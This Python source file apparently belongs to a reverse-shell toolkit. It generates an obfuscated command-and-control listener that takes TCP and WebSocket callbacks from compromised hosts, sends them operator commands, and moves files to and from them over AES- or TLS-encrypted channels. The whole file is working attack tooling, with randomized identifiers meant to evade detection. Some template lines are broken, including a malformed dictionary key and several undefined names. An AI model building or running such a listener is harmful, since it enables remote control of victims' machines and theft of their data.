import os
from .utilities import generate_obfuscated_name

def generate_listener(config):
    script_content = """
import socket
import threading
import time
import logging
import os
import datetime
import queue
import ssl
import base64
import zlib
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad, unpad
from Cryptodome.Random import get_random_bytes
from prompt_toolkit import PromptSession
from prompt_toolkit.history import FileHistory
import asyncio
import websockets

# --- Configuration ---
{obf_listen_ip} = "{lhost}"
{obf_listen_port} = {lport}
{obf_encoding_scheme} = "{encoding_scheme}"
{obf_encryption_enabled} = {encryption_enabled}
{obf_encryption_type} = "{encryption_type}"
{obf_log_dir} = "{log_dir}"
{obf_magic_delimiter} = "{delimiter}"
{obf_aes_key} = bytes.fromhex("{aes_key_hex}")
{obf_encoding_map} = {{
    "none": (lambda x: x, lambda x: x),
    "base64": (base64.b64encode, base64.b64decode),
    "zlib_base64": (lambda x: base64.b64encode(zlib.compress(x)), lambda x: zlib.decompress(base64.b64decode(x)))
}}

# --- Logging Setup ---
if not os.path.exists({obf_log_dir}):
    os.makedirs({obf_log_dir})
{obf_log_file} = os.path.join({obf_log_dir}, f"revlistener_{{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}}.log")
{obf_logger} = logging.getLogger('RevBotListener')
{obf_logger}.setLevel(logging.INFO)
file_handler = logging.FileHandler({obf_log_file})
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
file_handler.setFormatter(formatter)
{obf_logger}.addHandler(file_handler)
{obf_logger}.info(f"[*] Listener starting. Log file: {{{obf_log_file}}}")

# --- Encryption Functions ---
def {obf_encrypt_func}(data, key):
    iv = get_random_bytes(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded_data = pad(data, AES.block_size)
    ciphertext = cipher.encrypt(padded_data)
    return iv + ciphertext

def {obf_decrypt_func}(data, key):
    iv = data[:AES.block_size]
    ciphertext = data[AES.block_size:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_data = cipher.decrypt(ciphertext)
    return unpad(decrypted_data, AES.block_size)

# --- Send/Receive Helpers ---
def {obf_send_func}(conn, data, is_websocket=False):
    encode_func, _ = {obf_encoding_map}.get({obf_encoding_scheme}, {obf_encoding_map}["none"])
    if {obf_encryption_enabled} and {obf_encryption_type} == "aes":
        data = {obf_encrypt_func}(data.encode(), {obf_aes_key})
    else:
        data = data.encode()
    encoded_data = encode_func(data)
    if is_websocket:
        return encoded_data + {obf_magic_delimiter}.encode()
    conn.sendall(encoded_data + {obf_magic_delimiter}.encode())

def {obf_recv_func}(conn, data=None, is_websocket=False):
    _, decode_func = {obf_encoding_map}.get({obf_encoding_scheme}, {obf_encoding_map}["none"])
    if is_websocket:
        buffer = data
    else:
        buffer = b""
        while True:
            try:
                chunk = conn.recv(4096)
                if not chunk:
                    return ""
                buffer += chunk
                if {obf_magic_delimiter}.encode() in buffer:
                    data, _ = buffer.split({obf_magic_delimiter}.encode(), 1)
                    break
            except Exception as e:
                {obf_logger}.error(f"Receive error: {{e}}")
                return ""
    try:
        decoded_data = decode_func(data)
        if {obf_encryption_enabled} and {obf_encryption_type} == "aes":
            decoded_data = {obf_decrypt_func}(decoded_data, {obf_aes_key}).decode(errors="ignore")
        return decoded_data
    except Exception as e:
        {obf_logger}.error(f"Decode/decrypt error: {{e}}")
        return ""

# --- Session Management ---
{obf_client_sessions} = {{}}
{obf_session_id_counter} = 0
{obf_current_active_session} = None
{obf_session_lock} = threading.Lock()

def {obf_get_session_info}(session_id):
    with {obf_session_lock}:
        return {obf_client_sessions}.get(session_id)

def {obf_update_session_info}(session_id, key, value):
    with {obf_session_lock}:
        if session_id in {obf_client_sessions}:
            {obf_client_sessions}[session_id][key] = value

# --- TCP Listener ---
def {obf_tcp_listener}():
    global {obf_session_id_counter}
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if {obf_encryption_type} == "tls":
        try:
            context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            context.load_cert_chain("{server_crt}", "{server_key}")
            server_socket = context.wrap_socket(server_socket, server_side=True)
            {obf_logger}.info(f"[*] TLS enabled on {{_listen_ip}}:{{_listen_port}}")
            print(f"[*] TLS enabled. Using {{server_crt}} and {{server_key}}")
        except Exception as e:
            {obf_logger}.error(f"[!] TLS setup error: {{e}}")
            print(f"[!] TLS setup error: {{e}}")
            exit(1)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server_socket.bind(({obf_listen_ip}, {obf_listen_port}))
        server_socket.listen(5)
        {obf_logger}.info(f"[*] TCP Listener started on {{_listen_ip}}:{{_listen_port}}")
        print(f"[*] TCP Listener started on {{_listen_ip}}:{{_listen_port}}")
    except Exception as e:
        {obf_logger}.error(f"[!] Bind failed: {{e}}")
        print(f"[!] Bind failed: {{e}}")
        exit(1)
    prompt_thread = threading.Thread(target={obf_listener_prompt})
    prompt_thread.daemon = True
    prompt_thread.start()
    while True:
        try:
            conn, addr = server_socket.accept()
            {obf_session_id_counter} += 1
            session_id = {obf_session_id_counter}
            with {obf_session_lock}:
                {obf_client_sessions}[session_id] = {{
                    "socket": conn,
                    "address": addr,
                    "platform": "Unknown",
                    "last_active": time.time(),
                    "command_queue": queue.Queue(),
                    "response_queue": queue.Queue(),
                    "type": "tcp"
                }}
            {obf_logger}.info(f"[*] New TCP connection: Session {{session_id}} from {{addr[0]}}:{{addr[1]}}")
            print(f"[*] New TCP connection: Session {{session_id}} from {{addr[0]}}:{{addr[1]}}")
            client_handler = threading.Thread(target={obf_handle_client_session}, args=(conn, addr, session_id))
            client_handler.daemon = True
            client_handler.start()
        except Exception as e:
            {obf_logger}.error(f"[*] TCP Listener error: {{e}}")
            break
    server_socket.close()

# --- WebSocket Listener ---
async def {obf_websocket_handler}(websocket, path):
    global {obf_session_id_counter}
    {obf_session_id_counter} += 1
    session_id = {obf_session_id_counter}
    addr = websocket.remote_address
    with {obf_session_lock}:
        {obf_client_sessions}[session_id] = {{
            "socket": websocket,
            "address": addr,
            "platform": "Unknown",
            "last_active": time.time(),
            "command_queue": queue.Queue(),
            "response_queue):(queue.Queue(),
            "type": "websocket"
        }}
    {obf_logger}.info(f"[*] New WebSocket connection: Session {{session_id}} from {{addr[0]}}:{{addr[1]}}")
    print(f"[*] New WebSocket connection: Session {{session_id}} from {{addr[0]}}:{{addr[1]}}")
    try:
        initial_msg = await websocket.recv()
        platform = "Unknown"
        initial_msg = {obf_recv_func}(None, initial_msg, is_websocket=True)
        if "Platform: Windows" in initial_msg:
            platform = "Windows"
        elif any(p in initial_msg for p in ["Platform: Linux", "Platform: Unix", "Platform: Darwin"]):
            platform = "Unix"
        {obf_update_session_info}(session_id, "platform", platform)
        print(f"[*] Session {{session_id}} Platform: {{platform}}")
        while True:
            try:
                with {obf_session_lock}:
                    if session_id not in {obf_client_sessions}:
                        break
                    {obf_client_sessions}[session_id]["last_active"] = time.time()
                if not {obf_client_sessions}[session_id]["command_queue"].empty():
                    command = {obf_client_sessions}[session_id]["command_queue"].get()
                    encoded_command = {obf_send_func}(None, command, is_websocket=True)
                    await websocket.send(encoded_command)
                    response = await websocket.recv()
                    response = {obf_recv_func}(None, response, is_websocket=True)
                    if response:
                        {obf_client_sessions}[session_id]["response_queue"].put(response)
                        print(response)
            except Exception as e:
                {obf_logger}.error(f"[Session {{session_id}}] WebSocket error: {{e}}")
                break
    finally:
        with {obf_session_lock}:
            if session_id in {obf_client_sessions}:
                del {obf_client_sessions}[session_id]
                if session_id == {obf_current_active_session}:
                    {obf_current_active_session} = None
        {obf_logger}.info(f"[Session {{session_id}}] WebSocket closed from {{addr[0]}}:{{addr[1]}}")
        print(f"[*] Session {{session_id}} closed")

# --- Handle Client Session (TCP) ---
def {obf_handle_client_session}(conn, addr, session_id):
    try:
        initial_msg = {obf_recv_func}(conn)
        {obf_logger}.info(f"[Session {{session_id}}] Initial message: {{initial_msg}}")
        platform = "Unknown"
        if "Platform: Windows" in initial_msg:
            platform = "Windows"
        elif any(p in initial_msg for p in ["Platform: Linux", "Platform: Unix", "Platform: Darwin"]):
            platform = "Unix"
        {obf_update_session_info}(session_id, "platform", platform)
        print(f"[*] Session {{session_id}} Platform: {{platform}}")
        while True:
            time.sleep(1)
            with {obf_session_lock}:
                if session_id not in {obf_client_sessions}:
                    break
                {obf_client_sessions}[session_id]["last_active"] = time.time()
            if conn._closed:
                break
            try:
                if not {obf_client_sessions}[session_id]["command_queue"].empty():
                    command = {obf_client_sessions}[session_id]["command_queue"].get()
                    if command.startswith("upload_file "):
                        filepath = command[12:].strip()
                        if not os.path.exists(filepath):
                            print(f"[!] File '{{filepath}}' not found")
                            continue
                        with open(filepath, "rb") as f:
                            file_content = f.read()
                        if len(file_content) > 1024 * 1024:
                            print("[!] File too large (>1MB). Use smaller files.")
                            continue
                        {obf_send_func}(conn, "upload_init")
                        {obf_send_func}(conn, os.path.basename(filepath))
                        {obf_send_func}(conn, str(len(file_content)))
                        {obf_send_func}(conn, base64.b64encode(file_content).decode())
                        result = {obf_recv_func}(conn)
                        if result:
                            print(result)
                    elif command.startswith("download "):
                        {obf_send_func}(conn, command)
                        status = {obf_recv_func}(conn)
                        if status != "download_ready":
                            print(status)
                            continue
                        total_size = int({obf_recv_func}(conn))
                        if total_size > 1024 * 1024:
                            print("[!] File too large (>1MB). Use smaller files.")
                            continue
                        file_content_b64 = {obf_recv_func}(conn)
                        file_content = base64.b64decode(file_content_b64)
                        filename = f"received_{{int(time.time())}}_{{os.path.basename(command[9:].strip())}}"
                        with open(filename, "wb") as f:
                            f.write(file_content)
                        result = {obf_recv_func}(conn)
                        if result:
                            print(result)
                    else:
                        {obf_send_func}(conn, command)
                        result = {obf_recv_func}(conn)
                        if result:
                            {obf_client_sessions}[session_id]["response_queue"].put(result)
                            print(result)
            except Exception as e:
                {obf_logger}.error(f"[Session {{session_id}}] Error: {{e}}")
                print(f"[!] Session {{session_id}} error: {{e}}")
                break
    finally:
        with {obf_session_lock}:
            if session_id in {obf_client_sessions}:
                try:
                    conn.close()
                except:
                    pass
                del {obf_client_sessions}[session_id]
                if session_id == {obf_current_active_session}:
                    {obf_current_active_session} = None
        {obf_logger}.info(f"[Session {{session_id}}] Closed connection from {{addr[0]}}:{{addr[1]}}")
        print(f"[*] Session {{session_id}} closed")

# --- Listener Prompt ---
def {obf_listener_prompt}():
    global {obf_current_active_session}
    session_history_file = os.path.join({obf_log_dir}, "prompt_history.txt")
    session = PromptSession(history=FileHistory(session_history_file))
    while True:
        try:
            prompt_text = "(no session) > "
            if {obf_current_active_session} is not None:
                with {obf_session_lock}:
                    if {obf_current_active_session} in {obf_client_sessions}:
                        info = {obf_client_sessions}[{obf_current_active_session}]
                        addr_str = f"{{info['address'][0]}}:{{info['address'][1]}}"
                        platform_str = info['platform']
                        prompt_text = f"session {{{obf_current_active_session}}} ({{addr_str}} {{platform_str}}) #> "
                    else:
                        {obf_current_active_session} = None
            command = session.prompt(prompt_text)
            {obf_logger}.info(f"Prompt> {{command}}")
            if command.lower() == "sessions":
                with {obf_session_lock}:
                    if not {obf_client_sessions}:
                        print("[*] No active sessions.")
                    else:
                        print("\n--- Active Sessions ---")
                        for sid, info in {obf_client_sessions}.items():
                            age = int(time.time() - info['last_active'])
                            status = "ACTIVE" if sid == {obf_current_active_session} else "IDLE"
                            print(f"  ID: {{sid}} | {{info['address'][0]}}:{{info['address'][1]}} | Platform: {{info['platform']}} | Type: {{info['type']}} | Status: {{status}} | Last Active: {{age}}s ago")
                        print("-----------------------")
            elif command.lower().startswith("interact "):
                try:
                    sid = int(command.split(" ")[1])
                    with {obf_session_lock}:
                        if sid in {obf_client_sessions}:
                            {obf_current_active_session} = sid
                            print(f"[*] Interacting with session {{sid}}")
                        else:
                            print(f"[!] Session {{sid}} not found")
                except (ValueError, IndexError):
                    print("[!] Usage: interact <session_id>")
            elif command.lower() == "exit":
                {obf_logger}.info("[*] Shutting down listener")
                print("[*] Shutting down listener and sessions")
                with {obf_session_lock}:
                    for sid in list({obf_client_sessions}.keys()):
                        try:
                            if {obf_client_sessions}[sid]["type"] == "tcp":
                                {obf_send_func}({obf_client_sessions}[sid]["socket"], "exit")
                                {obf_client_sessions}[sid]["socket"].close()
                            del {obf_client_sessions}[sid]
                        except:
                            pass
                exit(0)
            elif {obf_current_active_session} is not None:
                with {obf_session_lock}:
                    if {obf_current_active_session} not in {obf_client_sessions}:
                        print("[!] Session disconnected")
                        {obf_current_active_session} = None
                        continue
                    {obf_client_sessions}[{obf_current_active_session}]["command_queue"].put(command)
                result = None
                for _ in range(10):
                    try:
                        result = {obf_client_sessions}[{obf_current_active_session}]["response_queue"].get_nowait()
                        break
                    except queue.Empty:
                        time.sleep(0.1)
                if result:
                    print(result.strip())
                    {obf_logger}.info(f"[Session {{{obf_current_active_session}}}] Command: {{command[:64]}}... | Response: {{result[:64]}}...")
                else:
                    print("[!] No response from client")
            else:
                print("[!] No active session. Use 'sessions' or 'interact <id>'")
        except KeyboardInterrupt:
            print("\n[*] Ctrl+C detected. Type 'exit' to quit")
            {obf_logger}.info("Prompt interrupted by Ctrl+C")
        except Exception as e:
            {obf_logger}.error(f"Prompt error: {{e}}")
            print(f"[!] Prompt error: {{e}}")

# --- Start WebSocket Server ---
async def {obf_start_websocket}():
    if {obf_encryption_type} == "tls":
        ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ssl_context.load_cert_chain("{server_crt}", "{server_key}")
        server = await websockets.serve({obf_websocket_handler}, {obf_listen_ip}, {obf_listen_port}, ssl=ssl_context)
    else:
        server = await websockets.serve({obf_websocket_handler}, {obf_listen_ip}, {obf_listen_port})
    {obf_logger}.info(f"[*] WebSocket Listener started on {{_listen_ip}}:{{_listen_port}}")
    print(f"[*] WebSocket Listener started on {{_listen_ip}}:{{_listen_port}}")
    await server.wait_closed()

# --- Main ---
if __name__ == "__main__":
    threading.Thread(target={obf_tcp_listener}, daemon=True).start()
    asyncio.run({obf_start_websocket}())
"""
    obf_names = {
        "listen_ip": generate_obfuscated_name(),
        "listen_port": generate_obfuscated_name(),
        "encoding_scheme": generate_obfuscated_name(),
        "encryption_enabled": generate_obfuscated_name(),
        "encryption_type": generate_obfuscated_name(),
        "log_dir": generate_obfuscated_name(),
        "magic_delimiter": generate_obfuscated_name(),
        "aes_key": generate_obfuscated_name(),
        "encoding_map": generate_obfuscated_name(),
        "encrypt_func": generate_obfuscated_name(),
        "decrypt_func": generate_obfuscated_name(),
        "send_func": generate_obfuscated_name(),
        "recv_func": generate_obfuscated_name(),
        "client_sessions": generate_obfuscated_name(),
        "session_id_counter": generate_obfuscated_name(),
        "current_active_session": generate_obfuscated_name(),
        "session_lock": generate_obfuscated_name(),
        "get_session_info": generate_obfuscated_name(),
        "update_session_info": generate_obfuscated_name(),
        "tcp_listener": generate_obfuscated_name(),
        "websocket_handler": generate_obfuscated_name(),
        "handle_client_session": generate_obfuscated_name(),
        "listener_prompt": generate_obfuscated_name(),
        "start_websocket": generate_obfuscated_name(),
        "logger": generate_obfuscated_name(),
        "log_file": generate_obfuscated_name(),
    }

    if not os.path.exists(config["output_dir"]):
        os.makedirs(config["output_dir"])
    listener_file = config["listener_file"]
    with open(listener_file, "w") as f:
        f.write(script_content.format(
            lhost=config["lhost"],
            lport=config["port"],
            encoding_scheme=config["encoding_scheme"],
            encryption_enabled=str(config["encryption_enabled"]).lower(),
            encryption_type=config["encryption_type"],
            log_dir=os.path.join(config["output_dir"], "logs"),
            delimiter=config["delimiter"],
            aes_key_hex=config["aes_key_hex"],
            server_crt=os.path.join(config["output_dir"], "server.crt"),
            server_key=os.path.join(config["output_dir"], "server.key"),
            **{f"obf_{k}": v for k, v in obf_names.items()}
        ))
    print(f"[*] Generated listener script: {listener_file}")
